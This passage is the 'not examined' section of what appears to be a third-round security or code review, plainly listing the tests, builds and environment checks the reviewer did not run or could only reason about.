  a service account, Secret Manager or Cloud Run.

### Not examined (round 3)

- `web/dist/client` beyond the settings asset: I confirmed that ONE bundle
  carries the new check and that the old one is gone, not that every rebuilt
  asset in the range corresponds to its source.
- No server was driven end to end and no browser ran: `web/e2e/run.sh` and
  `.agents/docs/testing/styrman/integration.sh` were not executed, and the row's
  rendering of U+202E is reasoned from `abbreviateKey`'s output plus React's
  escaping, not observed in a browser.
- `go test ./...` across the repo and the separate Caddy ingress module were not
  run — only the two packages in the diff, plus the `GOOS=darwin` builds.
- Round 2's open item stays open: whether the deployed image's home bind mount
  permits `ln` at all was again not checked against a running Kata VM. It no
  longer changes any severity, since the content check does not care how the
  bytes got there.
